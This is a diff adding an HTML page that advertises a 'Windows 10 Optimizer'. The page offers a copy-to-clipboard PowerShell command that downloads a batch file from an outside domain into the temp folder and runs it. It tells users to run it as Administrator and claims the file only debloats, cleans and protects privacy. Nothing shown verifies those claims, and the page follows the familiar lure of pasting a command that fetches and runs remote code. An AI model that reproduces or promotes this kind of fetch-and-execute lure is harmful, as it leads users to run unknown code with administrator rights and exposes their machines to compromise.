@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Win10 Automatic Optimization Script</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #ededed;
+            font-family: ui-monospace, 'Cascadia Code', 'Segoe UI Mono', monospace;
+            line-height: 1.6;
+            display: flex;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        main { max-width: 550px; width: 100%; }
+        h1 { font-size: 1.5rem; color: #fff; margin-bottom: 8px; }
+        p { color: #888; font-size: 0.9rem; }
+        
+        /* The Command Section */
+        .cmd-wrapper {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 25px 0;
+            cursor: pointer;
+        }
+        code { color: #00ff41; font-size: 0.85rem; word-break: break-all; }
+        
+        /* Details Section */
+        .details { margin-top: 30px; border-top: 1px solid #222; padding-top: 20px; }
+        ul { padding-left: 18px; color: #bbb; font-size: 0.85rem; }
+        li { margin-bottom: 10px; }
+        .warning { color: #ffa500; font-size: 0.75rem; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+<main>
+    <h1>Windows 10 Optimizer</h1>
+    <p>A single-command script to declutter and speed up your OS.</p>
+
+    <div class="cmd-wrapper" onclick="copyCmd()">
+        <code id="command">powershell -Command "wget 'https://bimsfault.net/automate.bat' -OutFile '%TEMP%\automate.bat'; & '%TEMP%\automate.bat'"
+</code>
+    </div>
+
+    <div class="details">
+        <span class="warning">What this does:</span>
+        <ul>
+            <li><strong>Debloat:</strong> Removes pre-installed sponsored apps and telemetry.</li>
+            <li><strong>Performance:</strong> Adjusts visual effects for maximum responsiveness.</li>
+            <li><strong>Privacy:</strong> Disables background tracking and data collection services.</li>
+            <li><strong>Clean:</strong> Clears system temp files and update cache automatically.</li>
+        </ul>
+    </div>
+
+    <p style="font-size: 0.7rem; margin-top: 50px;">
+        Click the command box to copy. Run in PowerShell as <b>Administrator</b>.
+    </p>
+</main>
+
+<script>
+    function copyCmd() {
+        const text = document.getElementById('command').innerText;
+        navigator.clipboard.writeText(text);
+        alert('Copied to clipboard.');
+    }
+</script>
+
+</body>
+</html>
